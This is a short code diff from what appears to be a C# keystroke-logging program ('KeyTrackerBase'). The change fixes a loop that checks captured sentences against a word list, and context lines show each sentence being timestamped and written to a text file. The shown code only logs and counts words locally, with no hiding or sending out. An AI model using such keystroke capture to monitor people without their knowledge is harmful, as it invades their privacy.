@@ -133,10 +133,14 @@ namespace KeyTrackerBase
                                             //writes entries to txt file - logger
                                             file.WriteLine(DateTime.Now.ToString() + ":  " + sentence);
                                             //word detection - NOT WORKING
-                                            for (int i = 0; sentence.Contains(words[i]) && i > 30; i++ )
+                                            for (int i = 0; i < words.Length; i++)
                                             {
-                                                countDetect++;
-                                                badWords += words[i] + " ";
+                                                if (sentence.Contains(words[i]))
+                                                {
+                                                    countDetect++;
+                                                    badWords += words[i] + " ";
+                                                }
+                                                
                                             }
                                             file.WriteLine("Amount of Words Detected: " + countDetect + " - Words: " + badWords);
                                         }
